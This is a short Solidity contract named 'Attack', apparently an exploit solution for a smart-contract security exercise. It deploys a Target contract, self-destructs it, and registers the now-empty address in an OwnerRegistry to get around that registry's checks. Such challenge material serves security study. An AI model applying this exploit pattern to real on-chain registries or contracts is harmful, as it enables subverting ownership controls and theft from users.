pragma solidity ^0.6.0;

import "./Target.sol";
import "./OwnerRegistry.sol";

contract Attack {
    Target public target;
    address public owned;

    function submitContract(address _nextOwner, address _registry) public {
        OwnerRegistry registry = OwnerRegistry(_registry);
        target = new Target(_nextOwner);
        target.destroy();

        owned = address(target);
        registry.addContract(address(target));
    }
}
